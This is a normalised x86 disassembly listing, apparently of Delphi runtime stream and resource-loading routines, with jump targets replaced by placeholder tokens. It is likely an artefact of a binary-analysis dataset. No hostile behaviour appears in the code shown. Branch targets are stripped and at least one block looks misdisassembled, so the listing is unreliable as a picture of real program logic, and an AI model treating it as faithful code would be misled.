call sub_4039a8
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
xor ecx ecx
mov cl bl
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x14 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
jmp r-xdata
sub_4156ac
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov ecx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0xc ]
cmp ebx eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b35c
call sub_4039a8
sub_4156e4
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov ecx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x10 ]
cmp ebx eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b35c
call sub_4039a8
sub_41571c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0xf000
jbe r-xdata
push 0x0
push 0x0
mov eax edi
call sub_4154a0
mov eax edi
mov edx [ eax ]
call [ edx ]
mov [ ebp + 0x8 ] eax
mov [ ebp + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x14 ] 0xf000
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x14 ]
call sub_4026bc
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x14 ]
cdq
cmp edx [ ebp + 0xc ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jge r-xdata
cmp eax [ ebp + 0x8 ]
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4157ff
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_4026dc
retn
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp - 0x14 ]
jmp r-xdata
jmp r-xdata
mov esi [ ebp - 0x18 ]
mov edx esi
mov ecx ebx
mov eax edi
call sub_4156ac
mov edx esi
mov ecx ebx
mov eax [ ebp - 0x4 ]
call sub_4156e4
mov eax ebx
cdq
sub [ ebp + 0x8 ] eax
sbb [ ebp + 0xc ] edx
sub_415810
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
push 0x1000
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_415e94
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_417ec8
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415867
mov eax [ ebp - 0x8 ]
call sub_403234
retn
sub_415870
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403204
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_4158cc
push ebp
mov ebp esp
add esp 0xfffffff8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
and edx 0x7f
mov eax [ eax + 0x4 ]
call sub_408154
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ecx
pop ecx
pop ebp
retn 0x8
sub_41590c
push ebp
mov ebp esp
push ebx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ ebx + 0x4 ]
push eax
call SetEndOfFile
call sub_40c738
pop ebx
pop ebp
retn 0x8
sub_415934
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov ax [ ebp + 0x8 ]
push eax
push 0x0
xor edx edx
mov eax esi
call sub_415978
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_415978
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] ebx
test dl dl
je r-xdata
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0xc ]
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
cmp di 0xffff
jne r-xdata
add esp 0xfffffff0
call sub_403540
movzx edx di
mov eax esi
call sub_408078
mov ecx eax
xor edx edx
mov eax ebx
call sub_415870
cmp [ ebx + 0x4 ] 0x0
jge r-xdata
mov edx [ ebp + 0x8 ]
mov eax esi
call sub_4080f4
mov ecx eax
xor edx edx
mov eax ebx
call sub_415870
cmp [ ebx + 0x4 ] 0x0
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415aa8
lea eax [ ebp - 0x24 ]
mov edx 0x4
call sub_403f90
retn
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_408294
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
call GetLastError
lea edx [ ebp - 0x24 ]
call sub_40aa98
mov eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b398
call sub_4039a8
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_408294
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
call GetLastError
lea edx [ ebp - 0x1c ]
call sub_40aa98
mov eax [ ebp - 0x1c ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b398
call sub_4039a8
jmp r-xdata
sub_415a22
arpl [ edi ] cx
mov bh 0xd7
mov eax esi
call sub_408078
mov ecx eax
xor edx edx
mov eax ebx
call sub_415870
cmp [ ebx + 0x4 ] 0x0
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415aa8
lea eax [ ebp - 0x24 ]
mov edx 0x4
call sub_403f90
retn
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_408294
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
call GetLastError
lea edx [ ebp - 0x24 ]
call sub_40aa98
mov eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b398
call sub_4039a8
sub_415aa8
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_415acc
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
jl r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403224
test bl bl
jle r-xdata
call sub_40818c
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_415b08
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0xc ]
test edi edi
jl r-xdata
xor esi esi
test ecx ecx
jl r-xdata
mov esi [ ebx + 0x8 ]
sub esi edi
test esi esi
jle r-xdata
cmp ecx esi
jge r-xdata
mov eax [ ebx + 0x4 ]
add eax edi
mov ecx esi
call sub_4028b8
add [ ebx + 0xc ] esi
jmp r-xdata
mov esi ecx
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_415b40
sub cx 0x1
jb r-xdata
mov [ eax + 0xc ] edx
jmp r-xdata
je r-xdata
mov eax [ eax + 0xc ]
retn
add [ eax + 0xc ] edx
jmp r-xdata
dec cx
je r-xdata
add edx [ eax + 0x8 ]
mov [ eax + 0xc ] edx
jmp r-xdata
sub_415b64
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
mov eax esi
call sub_415b90
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403224
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_415ba8
push ebx
push esi
push edi
mov edi edx
mov esi eax
push 0x0
push 0x0
mov eax edi
call sub_4154a0
mov eax edi
mov edx [ eax ]
call [ edx ]
mov ebx eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x4 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ esi + 0x4 ]
mov ecx ebx
mov eax edi
call sub_4156ac
sub_415be0
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov edx eax
mov ecx [ ebx + 0x8 ]
mov eax ebx
call sub_415b00
mov eax [ esp ]
mov [ ebx + 0x10 ] eax
pop edx
pop ebx
retn
sub_415c08
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0xc ]
mov edx esi
mov eax ebx
call sub_415be0
mov [ ebx + 0x8 ] esi
cmp esi edi
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov cx 0x2
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
sub_415c34
push ebx
push esi
push edi
cmp [ edx ] 0x0
jle r-xdata
mov esi [ eax + 0x4 ]
mov ecx esi
mov edi [ edx ]
mov ebx [ eax + 0x10 ]
cmp edi ebx
je r-xdata
mov ecx [ edx ]
cmp ecx [ eax + 0x8 ]
je r-xdata
mov eax ecx
pop edi
pop esi
pop ebx
retn
cmp [ edx ] 0x0
jne r-xdata
mov ecx [ edx ]
add ecx 0x1fff
and ecx 0xffffe000
mov [ edx ] ecx
test ebx ebx
jne r-xdata
mov eax esi
call sub_406830
xor ecx ecx
jmp r-xdata
mov ecx [ rw-data ]
movzx ecx [ ecx ]
mov edx [ edx ]
mov eax esi
call sub_406814
mov ecx eax
mov eax [ rw-data ]
movzx eax [ eax ]
mov edx [ edx ]
call sub_406804
mov ecx eax
jmp r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b35c
call sub_4039a8
test ecx ecx
jne r-xdata
sub_415cc0
push ebx
push esi
push edi
push ebp
mov esi ecx
mov ebp edx
mov ebx eax
mov eax [ ebx + 0xc ]
test eax eax
jl r-xdata
xor eax eax
test esi esi
jl r-xdata
mov edi eax
add edi esi
test edi edi
jle r-xdata
cmp edi [ ebx + 0x8 ]
jle r-xdata
mov edx [ ebx + 0x4 ]
add edx [ ebx + 0xc ]
mov eax ebp
mov ecx esi
call sub_4028b8
mov [ ebx + 0xc ] edi
mov eax esi
jmp r-xdata
cmp edi [ ebx + 0x10 ]
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] edi
mov edx edi
mov eax ebx
call sub_415be0
sub_415d10
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403204
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
call sub_40442c
mov ecx eax
mov edx esi
mov eax edi
call sub_415dd8
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_415d68
push ebp
mov ebp esp
add esp 0xfffffff4
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x6
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405a6c
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2dc
call sub_4039a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415dd2
lea eax [ ebp - 0xc ]
call sub_403f6c
retn
sub_415dd8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push esi
call FindResourceA
mov edi eax
mov [ ebx + 0x10 ] edi
test edi edi
jne r-xdata
mov eax [ ebx + 0x10 ]
push eax
push esi
call LoadResource
mov edi eax
mov [ ebx + 0x14 ] edi
test edi edi
jne r-xdata
push ebp
call sub_415d68
pop ecx
mov eax [ ebx + 0x10 ]
push eax
push esi
call SizeofResource
push eax
mov eax [ ebx + 0x14 ]
push eax
call LockResource
mov edx eax
mov eax ebx
pop ecx
call sub_415b00
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
push ebp
call sub_415d68
pop ecx
sub_415e44
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
call sub_406800
mov eax [ esi + 0x14 ]
push eax
call FreeResource
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403224
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_415e94
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
mov esi [ ebp + 0x8 ]
mov [ edi + 0x4 ] ecx
mov eax esi
call sub_4026bc
mov [ edi + 0x8 ] eax
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_415edc
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
test bl bl
jle r-xdata
mov edx [ esi + 0xc ]
call sub_4026dc
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_415fe0
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov eax [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0xc ] eax
lea eax [ esi + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_403fc0
lea eax [ esi + 0x14 ]
mov edx [ ebp + 0x8 ]
call sub_403fc0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_416038
push ebx
push esi
push edi
push ebp
mov edi eax
xor eax eax
mov esi [ edi + 0x14 ]
mov ebx esi
jmp r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
sub dl 0x2e
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp ebx
sub ebp esi
mov ecx ebp
lea eax [ edi + 0x10 ]
mov edx esi
call sub_40405c
mov ecx ebp
inc ecx
lea eax [ edi + 0x14 ]
mov edx 0x1
call sub_4044cc
mov al 0x1
inc ebx
sub_416090
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_4055a8
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
call sub_410c94
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41610e
lea eax [ ebp - 0x4 ]
call sub_4055a8
retn
mov eax [ ebx + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
call sub_4105a4
add eax 0x5
push eax
lea eax [ ebp - 0x4 ]
call sub_4055a8
mov ecx eax
mov eax esi
pop edx
call sub_40cc2c
test al al
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_4055a8
sub_416114
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4161c1
lea eax [ ebp - 0x8 ]
call sub_403f6c
retn
mov edi esi
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax ebx
jmp r-xdata
mov [ ebp - 0x4 ] edi
mov dl [ ebx ]
test dl dl
je r-xdata
mov ecx ebx
sub ecx eax
lea edx [ ebp - 0x8 ]
xchg edx eax
call sub_40405c
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_4196e8
mov esi eax
test esi esi
jne r-xdata
add dl 0xd3
sub dl 0x2
jae r-xdata
test esi esi
je r-xdata
mov edx r-xdata
mov eax [ ebp - 0x8 ]
call sub_407b48
test al al
je r-xdata
inc ebx
cmp [ ebx ] 0x2e
jne r-xdata
mov esi edi
cmp [ ebx ] 0x2d
jne r-xdata
inc ebx
cmp [ ebx ] 0x3e
jne r-xdata
inc ebx
mov edi esi
inc ebx
sub_4161dc
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_41389c
test eax eax
jge r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_41389c
test eax eax
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_4136e4
sub_416214
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_41389c
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_41389c
test eax eax
jge r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
xchg edx eax
call sub_413730
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_4136e4
sub_41625c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor edx edx
push ebp
push r-xdata
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
call sub_413bac
mov edi eax
xor edx edx
push ebp
push r-xdata
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ edi + 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4163dd
mov eax [ rw-data ]
call sub_413c10
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push r-xdata
push [ fs : edx ]
mov [ fs : edx ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push r-xdata
push [ fs : edx ]
mov [ fs : edx ] esp
xor esi esi
jmp r-xdata
cmp esi [ edi + 0x8 ]
jl r-xdata
mov edx esi
mov eax edi
call sub_413840
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_41338c
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41636c
mov eax [ ebp - 0x8 ]
call sub_403234
retn
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
call sub_4106d0
test eax eax
je r-xdata
push ebp
mov eax [ ebx + 0x4 ]
call sub_4161dc
pop ecx
mov edx esi
mov eax edi
call sub_413730
mov eax ebx
call sub_403234
jmp r-xdata
mov edx [ ebx + 0x14 ]
mov eax [ ebp - 0xc ]
call sub_416114
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx ]
push ebp
mov eax [ ebx + 0x4 ]
call sub_416214
pop ecx
inc esi
sub_41636c
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403234
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
and [ edi + 0x1c ] 0xff7f
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_413840
mov edi eax
mov eax edi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
sub_416404
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_413bac
mov edi eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_413c10
retn
mov edx ebx
mov eax edi
call sub_413840
mov esi eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x8 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov edx ebx
mov eax edi
call sub_413730
mov eax esi
call sub_403234
mov edx [ esi + 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_407b48
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_4164b0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_413bac
mov edi eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_413c10
retn
mov edx ebx
mov eax edi
call sub_413840
mov esi eax
mov eax [ esi + 0x4 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax edi
call sub_413730
mov eax esi
call sub_403234
sub_416558
push ebx
add esp 0xfffffff8
mov ebx eax
mov [ esp ] ebx
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b398
call sub_4039a8
pop ecx
pop edx
pop ebx
retn
sub_41659c
push ebx
push esi
push edi
call sub_4035a8
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
sub edx [ esi + 0x14 ]
mov eax [ esi + 0x4 ]
mov cx 0x1
mov edi [ eax ]
call [ edi + 0x14 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_415edc
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_4165d8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_4184b0
cmp bl al
je r-xdata
pop esi
pop ebx
retn
dec [ esi + 0x10 ]
mov eax esi
call sub_4185c0
call sub_41654c
sub_4165fc
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov edx [ ebx + 0x70 ]
mov eax esi
call sub_407b48
test al al
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
lea eax [ ebx + 0x70 ]
call sub_403f6c
sub_416630
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x70 ]
mov eax ebx
call sub_407b48
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4184b0
cmp al 0xa
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
call sub_416a74
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_416a74
mov eax [ ebp - 0x4 ]
mov [ eax + 0x78 ] 0x1
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4166f8
mov eax [ ebp - 0x8 ]
call sub_403234
retn
mov eax [ ebp - 0x4 ]
dec [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_4185c0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x78 ] 0x1
call sub_41654c
sub_416720
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x5a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push esp
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x5c ]
call [ ebx + 0x58 ]
sub_416740
push ebx
push esi
push edi
add esp 0xfffffef8
mov esi ecx
mov edi edx
mov ebx eax
lea eax [ esp + 0x8 ]
mov edx esi
mov ecx 0xff
call sub_404208
lea edx [ esp + 0x8 ]
mov eax [ edi ]
call sub_4034a0
mov [ esp ] eax
cmp [ esp ] 0x0
sete [ esp + 0x4 ]
cmp [ ebx + 0x3a ] 0x0
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
push esp
lea eax [ esp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
mov eax [ esp ]
add esp 0x108
pop edi
pop esi
pop ebx
retn
call sub_41654c
sub_4167a8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax [ rw-data ]
call sub_413bac
mov esi eax
xor edx edx
push ebp
push r-xdata
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41681f
mov eax [ rw-data ]
call sub_413c10
retn
mov edx ebx
mov eax esi
call sub_413840
mov edx [ eax + 0x4 ]
cmp edx [ edi + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx [ eax + 0xc ]
cmp edx [ edi + 0xc ]
jne r-xdata
call sub_403234
mov edx ebx
mov eax esi
call sub_413730
sub_416824
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41693a
lea eax [ ebp - 0x8 ]
call sub_403f6c
retn
